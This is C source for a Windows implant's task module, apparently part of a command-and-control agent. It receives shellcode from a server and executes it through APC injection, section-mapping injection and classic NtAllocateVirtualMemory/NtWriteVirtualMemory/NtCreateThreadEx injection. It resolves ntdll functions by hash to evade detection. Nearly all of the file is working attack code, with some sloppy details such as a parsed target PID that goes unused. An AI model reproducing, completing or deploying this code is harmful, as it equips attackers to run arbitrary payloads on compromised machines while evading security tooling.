#include <Windows.h>
#include <stdio.h>
#include "Task.h"
#include "../Definitions.h"
#include "../importer/Importer.h"
#include "../memoryCollector/MemoryCollector.h"
#include "../message/Message.h"

PMESSAGE pingServer()
{   
    PBYTE payload = (PBYTE)allocMemory(sizeof("PING"));
    DWORD paylaodSize = sizeof("PING");
    memcpy(payload, "PING\0", paylaodSize);
    return createMessage(PING_MESSAGE_TYPE,paylaodSize, payload);
}

PMESSAGE initAgentId(PBYTE payload, DWORD size)
{
    printf("initAgentId\n");
    PBYTE payloadS = (PBYTE)allocMemory(sizeof("initAgentId"));
    DWORD paylaodSize = sizeof("initAgentId");
    memcpy(payloadS, "initAgentId\0", paylaodSize);
    return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
};

PMESSAGE injectViaDllTask(PBYTE payload, DWORD size)
{
    /* NEED REFLECTED DLL KNOWNLEDGE */
    printf("injectViaDllTask\n");
    PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaDllTask"));
    DWORD paylaodSize = sizeof("injectViaDllTask");
    memcpy(payloadS, "injectViaDllTask\0", paylaodSize);
    return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
};

VOID AlertableFunction1() {
    // The 2nd parameter should be 'TRUE'
    SleepEx(INFINITE, TRUE);
};
PMESSAGE injectViaApcTask(PBYTE payload, DWORD size)
{
    /*
    First byte 0 -> APC injection
    First byte >0 -> Early Bird APC injection
    VirtualAlloc/Ex is replaced with NtAllocateVirtualMemory
    VirtualProtect/Ex is replaced with NtProtectVirtualMemory
    WriteProcessMemory is replaced with NtWriteVirtualMemory
    CreateThread/RemoteThread is replaced with NtCreateThreadEx
    */
   NTSTATUS  STATUS                 = 0x00;
   typedef NTSTATUS(NTAPI* fnNtAllocVirtualMemory)(
       IN      HANDLE    ProcessHandle,
       IN OUT PVOID     *BaseAddress,
       IN      ULONG_PTR ZeroBits,
       IN OUT PSIZE_T   RegionSize,
       IN      ULONG     AllocationType,
       IN      ULONG     Protect
   );
   fnNtAllocVirtualMemory allocVirtualMemory = (fnNtAllocVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTALLOCATEVIRTUALMEMORY_FUNCTION);

   typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(
       IN HANDLE               ProcessHandle,
       IN OUT PVOID            *BaseAddress,
       IN OUT PULONG           NumberOfBytesToProtect,
       IN ULONG                NewAccessProtection,
       OUT PULONG              OldAccessProtection 
   );
   fnNtProtectVirtualMemory protectVirtualMemory = (fnNtProtectVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTPROTECTVIRTUALMEMORY_FUNCTION);

   typedef NTSTATUS(NTAPI* fnNtWritetVirtualMemory)(
       IN HANDLE               ProcessHandle,
       IN OUT PVOID                BaseAddress,
       IN PVOID                Buffer,
       IN ULONG                NumberOfBytesToWrite,
       OUT PULONG              NumberOfBytesWritten OPTIONAL 
   );
   fnNtWritetVirtualMemory writeVirtualMemory = (fnNtWritetVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTWRITEVIRTUALMEMORY_FUNCTION);

   typedef struct _pObjectAttribute{} COBJECT_ATTRIBUTES, *PCOBJECT_ATTRIBUTES;
   typedef struct _pAttributeList{} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
   typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
       OUT PHANDLE ThreadHandle,
       IN ACCESS_MASK DesiredAccess,
       IN PCOBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
       IN HANDLE ProcessHandle,
       IN PVOID StartRoutine,
       IN PVOID Argument   OPTIONAL,
       IN ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
       IN SIZE_T ZeroBits,
       IN SIZE_T StackSize,
       IN SIZE_T MaximumStackSize,
       IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
   );
   fnNtCreateThreadEx createThread = (fnNtCreateThreadEx)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTCREATETHREAD_FUNCTION);

   typedef NTSTATUS (NTAPI* fnNtQueueApcThread)(
    IN HANDLE               ThreadHandle,                 // A handle to the thread to run the specified APC
    IN PVOID      ApcRoutine,                   // Pointer to the application-supplied APC function to be executed
    IN PVOID                ApcRoutineContext OPTIONAL,   // Pointer to a parameter (1) for the APC (set to NULL)
    IN PVOID     ApcStatusBlock OPTIONAL,      // Pointer to a parameter (2) for the APC (set to NULL)
    IN ULONG                ApcReserved OPTIONAL          // Pointer to a parameter (3) for the APC (set to NULL)
    );
    fnNtQueueApcThread apcQueue = (fnNtQueueApcThread)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTAPCQUEUETASK_FUNCTION);
   /*
   ---------------------------------------------------------
   |    PID    |                SHELLCODE                  |
   ---------------------------------------------------------
   */
   DWORD objectivePID = payload[3] << 24 | payload[2] << 16 | payload[1] << 8 | payload[0];  
   PVOID shellcode = payload + 4;
   ULONG oldProtection = 0;
   HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
   PVOID copyShellcode = NULL;
   SIZE_T pSize = size - 4;
   ULONG sNumberOfBytesWritten = 0;
   PVOID dataToBeWritten = payload + 4;

   if ((STATUS = allocVirtualMemory(hprocess, &copyShellcode, 0, &pSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)) != 0) {
       printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
       printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
       PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaApcTask FAILED"));
       DWORD paylaodSize = sizeof("injectViaApcTask FAILED");
       memcpy(payloadS, "injectViaApcTask FAILED\0", paylaodSize);
       return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
   }

   ULONG protectedMemorySize = size - 4;
   if ((STATUS = writeVirtualMemory(hprocess, copyShellcode, dataToBeWritten, protectedMemorySize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != protectedMemorySize) {
       printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
       printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, size - 4);
       printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
       PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaApcTask FAILED"));
       DWORD paylaodSize = sizeof("injectViaApcTask FAILED");
       memcpy(payloadS, "injectViaApcTask FAILED\0", paylaodSize);
       return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
   }

   /*
   if ((STATUS = protectVirtualMemory(hprocess, &copyShellcode, &protectedMemorySize, PAGE_EXECUTE_READWRITE, &oldProtection)) != 0) 
   {
       printf("[!] protectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
       PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaClassicProcessTask FAILED"));
       DWORD paylaodSize = sizeof("injectViaClassicProcessTask FAILED");
       memcpy(payloadS, "injectViaClassicProcessTask FAILED\0", paylaodSize);
       return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
   }
   */

   HANDLE tHandle = NULL;
   if ((STATUS = createThread(&tHandle, THREAD_ALL_ACCESS, NULL, hprocess, &AlertableFunction1,  NULL, 0, 0, 0, 0,  NULL)) != 0) 
   {
       printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
       PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaApcTask FAILED"));
       DWORD paylaodSize = sizeof("injectViaApcTask FAILED");
       memcpy(payloadS, "injectViaApcTask FAILED\0", paylaodSize);
       return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
   }

   if ((STATUS = apcQueue(tHandle, copyShellcode, NULL, NULL, 0)) != 0) 
   {
        printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
        PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaApcTask FAILED"));
        DWORD paylaodSize = sizeof("injectViaApcTask FAILED");
        memcpy(payloadS, "injectViaApcTask FAILED\0", paylaodSize);
        return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
    }

    printf("injectViaApcTask\n");
    PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaApcTask SUCCESSFUL"));
    DWORD paylaodSize = sizeof("injectViaApcTask SUCCESSFUL");
    memcpy(payloadS, "injectViaApcTask SUCCESSFUL\0", paylaodSize);
    return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
};

PMESSAGE injectViaFileMappingTask(PBYTE payload, DWORD size)
{
    /*
        CreateFileMapping is replaced with NtCreateSection
        MapViewOfFile is replaced with NtMapViewOfSection
        CloseHandle is replaced with NtClose
        UnmapViewOfFile is replaced with NtUnmapViewOfSection
    */
   typedef struct _OBJECT_ATTRIBUTES{}OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
   typedef NTSTATUS (NTAPI* NtCreateSection)(
    OUT PHANDLE             SectionHandle,          // Pointer to a HANDLE variable that receives a handle to the section object
    IN ACCESS_MASK          DesiredAccess,          // The type of the access rights to section handle 
    IN POBJECT_ATTRIBUTES   ObjectAttributes,       // Pointer to an OBJECT_ATTRIBUTES structure (set to NULL) 
    IN PLARGE_INTEGER       MaximumSize,            // Maximum size of the section
    IN ULONG                SectionPageProtection,  // Protection to place on each page in the section
    IN ULONG                AllocationAttributes,   // Allocation attributes of the section (SEC_XXX flags) 
    IN HANDLE               FileHandle              // Optionally specifies a handle for an open file object (set to NULL)
    );
    NtCreateSection createSection = (NtCreateSection)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTCREATESECTION_FUNCTION);
    
    typedef enum _SECTION_INHERIT {
        ViewShare = 1,
        ViewUnmap = 2
    } SECTION_INHERIT, * PSECTION_INHERIT;
    typedef NTSTATUS (WINAPI* NtMapViewOfSection)(
        IN HANDLE               SectionHandle,            // HANDLE to Section Object created by 'NtCreateSection'
        IN HANDLE               ProcessHandle,            // Process handle of the process to map the view to
        IN OUT PVOID            *BaseAddress,             // Pointer to a PVOID variable that receives the base address of the view
        IN ULONG                ZeroBits,                 // set to NULL
        IN SIZE_T               CommitSize,               // set to NULL  
        IN OUT PLARGE_INTEGER   SectionOffset,            // set to NULL
        IN OUT PSIZE_T          ViewSize,                 // A pointer to a SIZE_T variable that contains the size of the memory to be allocated
        IN SECTION_INHERIT      InheritDisposition,       // How the view is to be shared with child processes
        IN ULONG                AllocationType,           // type of allocation to be performed (set to NULL)
        IN ULONG                Protect                   // Protection for the region of allocated memory
    );
    NtMapViewOfSection mapViewOfSection = (NtMapViewOfSection)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_MAPVIEWOFSECTION_FUNCTION);

    typedef NTSTATUS (WINAPI* NtUnmapViewOfSection)(
        IN HANDLE               ProcessHandle,    // Process handle of the process that contains the view to unmap
        IN PVOID                BaseAddress       // Base address of the view to unmap
    );
    NtUnmapViewOfSection unmapView = (NtUnmapViewOfSection)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_MAPVIEWOFSECTION_FUNCTION);

    typedef NTSTATUS (WINAPI* NtClose)(
        IN HANDLE               ObjectHandle    // Handle of the object to close
    );
    NtClose close = (NtClose)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTCLOSE_FUNCTION);

   typedef struct _pObjectAttribute{} COBJECT_ATTRIBUTES, *PCOBJECT_ATTRIBUTES;
   typedef struct _pAttributeList{} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
   typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
       OUT PHANDLE ThreadHandle,
       IN ACCESS_MASK DesiredAccess,
       IN PCOBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
       IN HANDLE ProcessHandle,
       IN PVOID StartRoutine,
       IN PVOID Argument   OPTIONAL,
       IN ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
       IN SIZE_T ZeroBits,
       IN SIZE_T StackSize,
       IN SIZE_T MaximumStackSize,
       IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
   );
   fnNtCreateThreadEx createThread = (fnNtCreateThreadEx)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTCREATETHREAD_FUNCTION);

   NTSTATUS STATUS = 0x00;
   HANDLE hSection = NULL;
   LARGE_INTEGER lInteger = {
    .LowPart = size
   };
   if ((STATUS = createSection(&hSection, SECTION_ALL_ACCESS, NULL, &lInteger, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) 
   {
       printf("[!] createSection Failed With Error : 0x%0.8X \n", STATUS);
       PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaFileMappingTask FAILED"));
       DWORD paylaodSize = sizeof("injectViaFileMappingTask FAILED");
       memcpy(payloadS, "injectViaFileMappingTask FAILED\0", paylaodSize);
       return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
   }

   HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
   PVOID copyShellcode = NULL;
   SIZE_T pSize = size;
   if ((STATUS = mapViewOfSection(hSection, hprocess, &copyShellcode, 0, 0, NULL, &pSize, ViewShare, 0, PAGE_EXECUTE_READWRITE)) != 0) 
   {
        printf("[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
        PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaFileMappingTask FAILED"));
        DWORD paylaodSize = sizeof("injectViaFileMappingTask FAILED");
        memcpy(payloadS, "injectViaFileMappingTask FAILED\0", paylaodSize);
        return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
    }
    memcpy(copyShellcode, payload, size);
    HANDLE tHandle = 0;
    if ((STATUS = createThread(&tHandle, THREAD_ALL_ACCESS, NULL, hprocess, copyShellcode,  NULL,0, 0, 0, 0,  NULL)) != 0) 
    {
        printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
        PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaClassicProcessTask FAILED"));
        DWORD paylaodSize = sizeof("injectViaClassicProcessTask FAILED");
        memcpy(payloadS, "injectViaClassicProcessTask FAILED\0", paylaodSize);
        return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
	}

    WaitForSingleObject(tHandle, 10000);
    printf("injectViaFileMappingTask SUCCESSFUL\n");
    PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaFileMappingTask SUCCESSFUL"));
    DWORD paylaodSize = sizeof("injectViaFileMappingTask SUCCESSFUL");
    memcpy(payloadS, "injectViaFileMappingTask SUCCESSFUL\0", paylaodSize);
    return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
};

PMESSAGE injectViaClassicProcessTask(PBYTE payload, DWORD size)
{
    /*
    VirtualAlloc/Ex is replaced with NtAllocateVirtualMemory
    VirtualProtect/Ex is replaced with NtProtectVirtualMemory
    WriteProcessMemory is replaced with NtWriteVirtualMemory
    CreateThread/RemoteThread is replaced with NtCreateThreadEx
    */
    NTSTATUS  STATUS                 = 0x00;
    typedef NTSTATUS(NTAPI* fnNtAllocVirtualMemory)(
        IN      HANDLE    ProcessHandle,
        IN OUT PVOID     *BaseAddress,
        IN      ULONG_PTR ZeroBits,
        IN OUT PSIZE_T   RegionSize,
        IN      ULONG     AllocationType,
        IN      ULONG     Protect
    );
    fnNtAllocVirtualMemory allocVirtualMemory = (fnNtAllocVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTALLOCATEVIRTUALMEMORY_FUNCTION);

    typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(
        IN HANDLE               ProcessHandle,
        IN OUT PVOID            *BaseAddress,
        IN OUT PULONG           NumberOfBytesToProtect,
        IN ULONG                NewAccessProtection,
        OUT PULONG              OldAccessProtection 
    );
    fnNtProtectVirtualMemory protectVirtualMemory = (fnNtProtectVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTPROTECTVIRTUALMEMORY_FUNCTION);

    typedef NTSTATUS(NTAPI* fnNtWritetVirtualMemory)(
        IN HANDLE               ProcessHandle,
        IN OUT PVOID                BaseAddress,
        IN PVOID                Buffer,
        IN ULONG                NumberOfBytesToWrite,
        OUT PULONG              NumberOfBytesWritten OPTIONAL 
    );
    fnNtWritetVirtualMemory writeVirtualMemory = (fnNtWritetVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTWRITEVIRTUALMEMORY_FUNCTION);

    typedef struct _pObjectAttribute{} COBJECT_ATTRIBUTES, *PCOBJECT_ATTRIBUTES;
    typedef struct _pAttributeList{} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
    typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
        OUT PHANDLE ThreadHandle,
        IN ACCESS_MASK DesiredAccess,
        IN PCOBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
        IN HANDLE ProcessHandle,
        IN PVOID StartRoutine,
        IN PVOID Argument   OPTIONAL,
        IN ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
        IN SIZE_T ZeroBits,
        IN SIZE_T StackSize,
        IN SIZE_T MaximumStackSize,
        IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
    );
    fnNtCreateThreadEx createThread = (fnNtCreateThreadEx)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTCREATETHREAD_FUNCTION);
    /*
    ---------------------------------------------------------
    |    PID    |                SHELLCODE                  |
    ---------------------------------------------------------
    */
    DWORD objectivePID = payload[3] << 24 | payload[2] << 16 | payload[1] << 8 | payload[0];  
    PVOID shellcode = payload + 4;
    ULONG oldProtection = 0;
    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    PVOID copyShellcode = NULL;
    SIZE_T pSize = size - 4;
    ULONG sNumberOfBytesWritten = 0;
    PVOID dataToBeWritten = payload + 4;

    if ((STATUS = allocVirtualMemory(hprocess, &copyShellcode, 0, &pSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
        PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaClassicProcessTask FAILED"));
        DWORD paylaodSize = sizeof("injectViaClassicProcessTask FAILED");
        memcpy(payloadS, "injectViaClassicProcessTask FAILED\0", paylaodSize);
        return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
	}

    ULONG protectedMemorySize = size - 4;
    if ((STATUS = writeVirtualMemory(hprocess, copyShellcode, dataToBeWritten, protectedMemorySize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != protectedMemorySize) {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, size - 4);
		PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaClassicProcessTask FAILED"));
        DWORD paylaodSize = sizeof("injectViaClassicProcessTask FAILED");
        memcpy(payloadS, "injectViaClassicProcessTask FAILED\0", paylaodSize);
        return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
	}

    /*
    if ((STATUS = protectVirtualMemory(hprocess, &copyShellcode, &protectedMemorySize, PAGE_EXECUTE_READWRITE, &oldProtection)) != 0) 
    {
        printf("[!] protectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
        PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaClassicProcessTask FAILED"));
        DWORD paylaodSize = sizeof("injectViaClassicProcessTask FAILED");
        memcpy(payloadS, "injectViaClassicProcessTask FAILED\0", paylaodSize);
        return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
	}
    */

    HANDLE tHandle = NULL;
    if ((STATUS = createThread(&tHandle, THREAD_ALL_ACCESS, NULL, hprocess, copyShellcode,  NULL,0, 0, 0, 0,  NULL)) != 0) 
    {
        printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
        PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaClassicProcessTask FAILED"));
        DWORD paylaodSize = sizeof("injectViaClassicProcessTask FAILED");
        memcpy(payloadS, "injectViaClassicProcessTask FAILED\0", paylaodSize);
        return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);
	}
    printf("injectViaClassicProcessTask\n");
    PBYTE payloadS = (PBYTE)allocMemory(sizeof("injectViaClassicProcessTask SUCCESSFUL"));
    DWORD paylaodSize = sizeof("injectViaClassicProcessTask SUCCESSFUL");
    memcpy(payloadS, "injectViaClassicProcessTask SUCCESSFUL\0", paylaodSize);
    return createMessage(PING_MESSAGE_TYPE,paylaodSize, payloadS);

};